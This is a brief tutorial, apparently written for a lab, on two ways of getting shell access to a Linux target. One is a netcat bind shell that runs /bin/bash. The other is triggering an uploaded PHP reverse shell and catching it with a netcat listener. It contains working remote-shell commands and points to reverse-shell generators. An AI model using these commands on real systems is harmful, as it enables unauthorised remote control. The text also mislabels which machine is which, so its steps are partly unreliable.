# various-process-of-getting-shell-access
Here We'll discuss how to get a shell in multiple ways -->

#For LINUX REMOTE PC -->

First assume your ATTACK/HACKER PC IP is 10.10.201.217 & your REMOTE/ATTACKING/TARGET PC IP is 10.10.152.101

Type-1: Simple bind shell using netcat

This is the easiest process. Assume you already has SSH ACCESS and netcat needs to be installed on both the devices.

1. Log in to Remote pc using ssh ID and pass. then type the below command in remote pc terminal-

nc -lvnp 4000 -e /bin/bash (this will create a Bind shell in remote pc and it starts looking for any conenction in it's 4000 port

2. Now in remote pc terminal type

nc 10.10.152.101 4000 (this will connect you to remote pc shell using 4000 port)


#Type 2: using php-reverse-shell 
Assume you have uploaded a revershe shell file to the vulnerable web server by any means. Assume the file name is "shell.php" and it's in /var/www/html folder of 10.10.152.101 ip. Activate this file by typing below command in your browser in your attack machine

http://10.10.152.101/shell.php  (you'll see your browser starts loading and unresponsive, which means the shell has been activated)

Now try the below command in your attacking machine terminal

nc -lvnp <port num>  (here the port number is the port number which you mentioned in your shell.php file)

you can create the shell file from your kali linux /usr/share/webshells folder or you can use https://www.revshells.com/ or https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary to generate and download the file

